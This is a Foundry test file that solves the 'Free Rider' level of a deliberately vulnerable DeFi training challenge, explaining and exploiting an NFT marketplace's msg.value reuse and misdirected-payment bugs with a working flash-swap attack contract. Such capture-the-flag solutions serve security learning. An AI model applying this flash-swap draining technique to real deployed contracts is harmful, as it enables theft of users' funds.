// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";

import {Utilities} from "../../utils/Utilities.sol";
import {FreeRiderRecovery} from "../../../src/Contracts/free-rider/FreeRiderRecovery.sol";
import {FreeRiderNFTMarketplace} from "../../../src/Contracts/free-rider/FreeRiderNFTMarketplace.sol";
import {IUniswapV2Router02, IUniswapV2Factory, IUniswapV2Pair} from "../../../src/Contracts/free-rider/Interfaces.sol";
import {DamnValuableNFT} from "../../../src/Contracts/DamnValuableNFT.sol";
import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {WETH9} from "../../../src/Contracts/WETH9.sol";

contract FreeRider is Test {
    // The NFT marketplace will have 6 tokens, at 15 ETH each
    uint256 internal constant NFT_PRICE = 15 ether;
    uint8 internal constant AMOUNT_OF_NFTS = 6;
    uint256 internal constant MARKETPLACE_INITIAL_ETH_BALANCE = 90 ether;

    uint256 internal constant PLAYER_INITIAL_ETH_BALANCE = 1e17;

    // The buyer will offer 45 ETH as payout for the job
    uint256 internal constant BOUNTY = 45 ether;

    // Initial reserves for the Uniswap v2 pool
    uint256 internal constant UNISWAP_INITIAL_TOKEN_RESERVE = 15_000e18;
    uint256 internal constant UNISWAP_INITIAL_WETH_RESERVE = 16 ether;

    FreeRiderRecovery internal devsContract;
    FreeRiderNFTMarketplace internal freeRiderNFTMarketplace;
    DamnValuableToken internal dvt;
    DamnValuableNFT internal damnValuableNFT;
    IUniswapV2Pair internal uniswapV2Pair;
    IUniswapV2Factory internal uniswapV2Factory;
    IUniswapV2Router02 internal uniswapV2Router;
    Utilities internal utils;
    WETH9 internal weth;
    address payable internal devs;
    address payable internal player;
    address payable internal deployer;

    function setUp() public {
        /**
         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
         */

        utils = new Utilities();
        address payable[] memory users;
        users = utils.createUsers(3);
        deployer = users[0];
        player = users[1];
        devs = users[2];

        // Player starts with little ETH balance
        vm.label(player, "Player");
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(player.balance,PLAYER_INITIAL_ETH_BALANCE);

        // Deployer starts with UNISWAP_INITIAL_WETH_RESERVE ETH balance
        vm.label(deployer, "Deployer");
        vm.deal(deployer, UNISWAP_INITIAL_WETH_RESERVE + MARKETPLACE_INITIAL_ETH_BALANCE);
        assertEq(deployer.balance,UNISWAP_INITIAL_WETH_RESERVE + MARKETPLACE_INITIAL_ETH_BALANCE);

        // Deploy WETH contract
        weth = new WETH9();
        vm.label(address(weth), "WETH");

        // Deploy token to be traded against WETH in Uniswap v2
        vm.startPrank(deployer);
        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        // Deploy Uniswap Factory and Router
        uniswapV2Factory =
            IUniswapV2Factory(deployCode("./src/build-uniswap/v2/UniswapV2Factory.json", abi.encode(address(0))));

        uniswapV2Router = IUniswapV2Router02(
            deployCode(
                "./src/build-uniswap/v2/UniswapV2Router02.json", abi.encode(address(uniswapV2Factory), address(weth))
            )
        );

        // Approve tokens, and then create Uniswap v2 pair against WETH and add liquidity
        // Note that the function takes care of deploying the pair automatically
        dvt.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}(
            address(dvt), // token to be traded against WETH
            UNISWAP_INITIAL_TOKEN_RESERVE, // amountTokenDesired
            0, // amountTokenMin
            0, // amountETHMin
            deployer, // to
            block.timestamp * 2 // deadline
        );

        // Get a reference to the created Uniswap pair
        uniswapV2Pair = IUniswapV2Pair(uniswapV2Factory.getPair(address(dvt), address(weth)));

        assertEq(uniswapV2Pair.token0(), address(dvt) < address(weth) ? address(dvt) :  address(weth));
        assertEq(uniswapV2Pair.token1(), address(dvt) < address(weth) ? address(weth) :  address(dvt));
        assertGt(uniswapV2Pair.balanceOf(deployer), 0);

        // Deploy the marketplace and get the associated ERC721 token
        // The marketplace will automatically mint AMOUNT_OF_NFTS to the deployer (see `FreeRiderNFTMarketplace::constructor`)
        freeRiderNFTMarketplace = new FreeRiderNFTMarketplace{
            value: MARKETPLACE_INITIAL_ETH_BALANCE
        }(AMOUNT_OF_NFTS);

        damnValuableNFT = DamnValuableNFT(freeRiderNFTMarketplace.token());
        assertEq(damnValuableNFT.owner() , address(0)); // ownership renounced
        assertEq(damnValuableNFT.rolesOf(address(freeRiderNFTMarketplace)), damnValuableNFT.MINTER_ROLE());

        // Ensure deployer owns all minted NFTs. Then approve the marketplace to trade them.
        for (uint8 id = 0; id < AMOUNT_OF_NFTS; id++) {
            assertEq(damnValuableNFT.ownerOf(id), deployer);
        }
        damnValuableNFT.setApprovalForAll(address(freeRiderNFTMarketplace), true);

        // Open offers in the marketplace
        uint256[] memory NFTsForSell = new uint256[](6);
        uint256[] memory NFTsPrices = new uint256[](6);
        for (uint8 i = 0; i < AMOUNT_OF_NFTS;) {
            NFTsForSell[i] = i;
            NFTsPrices[i] = NFT_PRICE;
            unchecked {
                ++i;
            }
        }

        freeRiderNFTMarketplace.offerMany(NFTsForSell, NFTsPrices);

        assertEq(freeRiderNFTMarketplace.offersCount(), AMOUNT_OF_NFTS);

        vm.stopPrank();

        vm.startPrank(devs);

        vm.deal(devs, BOUNTY);

        // Deploy devs' contract, adding the player as the beneficiary
        devsContract = new FreeRiderRecovery{value: BOUNTY}(
            player,
            address(damnValuableNFT)
        );

        vm.stopPrank();

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */

        // There are two exploits here :
        // The first one is to notice that the _buyOne function transfers the NFTs whithout keeping track of the ether sent by the user. It only uses msg.value for checking that the value sent by a user is more than the price of the token. However, a user can call buyMany to buy more than 1 NFT and only send the price for one NFT. It will still buy both tokens because msh.value does not change and there are no internal accounting for the spent ether.
        // The second issue is this line : payable(_token.ownerOf(tokenId)).sendValue(priceToPay); This code is executed after the transfer of the NFT to the new owner. This means that _token.ownerOf(tokenId) is the new owner and not the one who sold the NFT. This means that player can get all the NFTs for free, gets his initial 15 ether AND drain the contract for 75 additionnal ether.

        // The only remaining issue now, is how do we get the initial 15 ether to call buyMany and get all 6 tokens ? We only have 0,01 ether. We need some type of flash Loan to get the remaining ether call buyMany to buy the NFTs for free, get our tokens back with additional ether and then pay back the loan in one TX.
        // There is actually a way to do that in Uniswap and it is called Flash Swaps. 
        // The idea is to call the function swap() of the UniswapV2Pair contract which transfers us the tokens we want. Then via the callback IUniswapV2Callee(to).uniswapV2Call(msg.sender, amount0Out, amount1Out, data); we can execute the exploit and pay back the ether borrowed in one tx. More info https://docs.uniswap.org/contracts/v2/guides/smart-contract-integration/using-flash-swaps
        // Also there is an implementation of an example : https://github.com/Uniswap/v2-periphery/blob/master/contracts/examples/ExampleFlashSwap.sol

        uint256[] memory NFTsForSell = new uint256[](6);
        for (uint8 i = 0; i < AMOUNT_OF_NFTS;) {
            NFTsForSell[i] = i;
            unchecked {
                ++i;
            }
        }

        vm.startPrank(player, player);

        Exploit exploit = new Exploit{value : player.balance}(weth, freeRiderNFTMarketplace, uniswapV2Pair, uniswapV2Factory, uniswapV2Router);
        bytes memory data = abi.encode(NFTsForSell);
        uniswapV2Pair.swap(address(dvt) < address(weth) ? 0 : 15 ether, address(dvt) < address(weth) ? 15 ether : 0, address(exploit), data);

        for (uint8 i = 0; i < AMOUNT_OF_NFTS;) {
            damnValuableNFT.safeTransferFrom(player, address(devsContract), i, abi.encode(player));
            unchecked {
                ++i;
            }
        }

        vm.stopPrank();
        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        /**
         * SUCCESS CONDITIONS
         */

        // The devs extracts all NFTs from its associated contract
        vm.startPrank(devs);
        for (uint256 tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
            damnValuableNFT.transferFrom(address(devsContract), devs, tokenId);
            assertEq(damnValuableNFT.ownerOf(tokenId), devs);
        }
        vm.stopPrank();

        
        // Exchange must have lost NFTs and ETH
        assertEq(freeRiderNFTMarketplace.offersCount(), 0);
        assertLt(address(freeRiderNFTMarketplace).balance, MARKETPLACE_INITIAL_ETH_BALANCE);

        // Player must have earned all ETH from the payout
        assertGt(player.balance, BOUNTY);
        assertEq(address(devsContract).balance, 0);
    }
}

interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;
}

interface IERC721Receiver {    
    
    function onERC721Received(
    address operator,
    address from,
    uint256 tokenId,
    bytes calldata data
) external returns (bytes4);
}

contract Exploit is IUniswapV2Callee, IERC721Receiver {

    WETH9 internal weth;
    FreeRiderNFTMarketplace internal freeRiderNFTMarketplace;
    IUniswapV2Pair uniswapV2Pair;
    IUniswapV2Factory internal uniswapV2Factory;
    IUniswapV2Router02 uniswapV2Router;
    address internal owner;

    constructor(WETH9 _weth, FreeRiderNFTMarketplace _freeRiderNFTMarketplace, IUniswapV2Pair _uniswapV2Pair, IUniswapV2Factory _uniswapV2Factory, IUniswapV2Router02 _uniswapV2Router) payable{
        owner = msg.sender;
        weth = _weth;
        freeRiderNFTMarketplace =_freeRiderNFTMarketplace;
        uniswapV2Pair = _uniswapV2Pair;
        uniswapV2Factory = _uniswapV2Factory;
        uniswapV2Router =_uniswapV2Router;
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {

        // Some sanity checks
        require(msg.sender == address(uniswapV2Pair));
        require(amount0 == 0 || amount1 == 0); 
        require(sender == owner);

        // Call buyMany and get all the NFTs
        uint256 amountETH =  amount0 == 0 ? amount1 : amount0;
        weth.withdraw(amountETH);

        uint256[] memory tokenIds = abi.decode(data , (uint256[]));
        freeRiderNFTMarketplace.buyMany{value : amountETH}(tokenIds);
        // Transfer them to player
        DamnValuableNFT token = freeRiderNFTMarketplace.token();
        for (uint8 i = 0; i < tokenIds.length;) {
            token.transferFrom(address(this), owner, tokenIds[i]);
            unchecked {
                ++i;
            }
        }
        // @note we now need to calculate the amount that we need to pay back to the UniswapV2Pair.
        // The math logic is explained here : https://docs.uniswap.org/contracts/v2/guides/smart-contract-integration/using-flash-swaps#single-token
        // In short : DAIReturned >= DAIWithdrawn / .997

        // Let's demonstrate this :
        // The UniswapV2Pair swap() function has the following check : require(balance0Adjusted.mul(balance1Adjusted) >= uint(_reserve0).mul(_reserve1).mul(1000**2), 'UniswapV2: K');
        // reserve1 and balance1Adjusted is the same as we didnt trade in this pair.
        // This becomes : require(balance0Adjusted >= uint(_reserve0).mul(1000), 'UniswapV2: K'); with : 
        // uint balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(3)); and 
        // uint amount0In = balance0 - (_reserve0 - amount0Out); and 
        // balance0 = IERC20(_token0).balanceOf(address(this)); 
        // We know that balance0 - (_reserve0 - amount0Out) > 0 since balance0 is calculated after the return of funds and reserve0 is the balance before the loan. 
        // Simplifying the balance0Adjusted formula we would have :
        // balance0Adjusted >= _reserve0 * 1000
        // <=> balance0 * 1000 - (balance0 - (_reserve0 - amount0Out))*3 >= _reserve0 * 1000
        // <=> balance0 * 997 + reserve0*3 - amount0out * 3 >= _reserve0 * 1000
        // However, balance0 is the balance before + returned funds : balance0 = _reserve0 - amount0out + amountReturned
        // <=> (_reserve0 - amount0out + amountReturned) * 997 + reserve0 * 3 - amount0out * 3 >= _reserve0 * 1000
        // <=> _reserve0 * 1000 + amountReturned * 997 - amount0out * 1000 >= _reserve0 * 1000
        // After symplification : <=> amountReturned * 997 - amount0out * 1000 >= 0
        // which finally gives : amountReturned >= amount0out * 1000 / 997 or amountReturned >= amount0out / 0,997

        // There are many ways to calculate this amount, either directly or using uniswapV2Router functions.
        // The trick when using uniswapV2Router is to calculate the equivalent amount of dvt for the eth received which would seem like we received dvt instead of eth, then use the function getAmountIn to calculate the amount of eth than we need to provide to receive the dvt.
        (uint256 reserve1, uint256 reserve2,) = uniswapV2Pair.getReserves();
        (uint256 reserveETH, uint256 reserveDvt) = amount0 == 0 ? (reserve2 , reserve1) : (reserve1 , reserve2) ;
        uint256 ethToToken = uniswapV2Router.quote(amountETH, reserveETH, reserveDvt);
        uint256 amountRequired = uniswapV2Router.getAmountIn(ethToToken, reserveETH, reserveDvt);

        // @note Due to the fact that the flashSwap is equivalent to a swap in the same token. The invariant formula would be slightly altered in this manner : (y - dy + dy'*997/1000) = y (the x part cancels out as x is not changed). This means that getAmountIn would give a slightly bigger value than what is required to pay in the usual case where the reserve are big and the amount swapped is small. In the unusual case, where a big swap is taking place or the reserve are small the invariant formula would result in a way higher value than the manual formula. Proof :
        // Comparing the two formulas without fees :
        // Manual formula : dy' = dy (1)
        // getAmountIn : dy' = (y * dy) / (y - dy). (2) (we replace all dx and x with y and dy since we are swapping same token)
        // Whe have (y - dy) < y => dy' > dy
        // When dy << y then dy' = (y * dy) / y => dy' = dy (same as previous formula)
        // When dy ≈ y then 1/(y - dy) >= 1 => dy' >= (y * dy) > dy. For example, if UNISWAP_INITIAL_WETH_RESERVE = 16 ether, amountRequired calculated with getAmountIn would give 240 ether ( = 16 * 15).
        // In any case for (2) dy' >= dy 
        // @note The most logical solution would be to use formula (1) with fees applied.

        // require(amountRequired >= amountETH * 1000 / 997 + 1);
        console.log(amountRequired);
        uint256 amountRequiredManual = amountETH * 1000 / 997 + 1; // (1)
        console.log(amountRequiredManual);
        uint256 minAmountRequired = amountRequired >= amountRequiredManual ? amountRequiredManual : amountRequired;
        // We transfer the amount back to uniswapV2Pair
        weth.deposit{value : minAmountRequired}();
        require(weth.transfer(msg.sender, minAmountRequired));
        // Send any remaining tokens to player
        (bool ok, ) = owner.call{value: address(this).balance}("");
        require(ok);
    }

    function onERC721Received(address, address, uint256, bytes memory)
        external pure
        override
        returns (bytes4)
    {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}